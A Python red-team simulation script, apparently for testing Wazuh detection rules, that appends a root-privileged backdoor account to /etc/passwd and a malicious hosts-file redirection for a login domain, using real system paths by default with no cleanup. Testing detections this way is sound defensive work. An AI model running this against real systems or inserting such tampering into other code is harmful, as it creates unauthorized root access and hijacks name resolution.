#!/usr/bin/env python3
"""
Red Team Simulation: System Configuration File Tampering
Simulates adversary gaining unauthorized write access and modifying critical
identity or network configuration files (e.g. /etc/passwd, /etc/hosts).
Corresponds to Wazuh Rule 100010 (MITRE T1098) & Rule 100018 (MITRE T1565.001).
"""

import os
import sys
import argparse
from pathlib import Path

def tamper_identity_file(target_path: Path):
    print(f"[*] Tampering with identity file: {target_path}")
    if not target_path.exists():
        print(f"[-] Target file does not exist: {target_path}")
        return False

    with open(target_path, "a", encoding="utf-8") as f:
        f.write("wazuh_backdoor:x:0:0:Rogue Root Account:/root:/bin/bash\n")
    print(f"[+] Injected backdoor account into {target_path}")
    return True

def tamper_network_file(target_path: Path):
    print(f"[*] Tampering with network routing / hosts file: {target_path}")
    if not target_path.exists():
        print(f"[-] Target file does not exist: {target_path}")
        return False

    with open(target_path, "a", encoding="utf-8") as f:
        f.write("198.51.100.99 secure-login.internal.corp  # Malicious C2 redirection\n")
    print(f"[+] Injected malicious DNS mapping into {target_path}")
    return True

def main():
    parser = argparse.ArgumentParser(description="Simulate System File Tampering")
    parser.add_argument("--passwd-path", type=str, default="/etc/passwd")
    parser.add_argument("--hosts-path", type=str, default="/etc/hosts")
    args = parser.parse_args()

    tamper_identity_file(Path(args.passwd_path))
    tamper_network_file(Path(args.hosts_path))

if __name__ == "__main__":
    main()
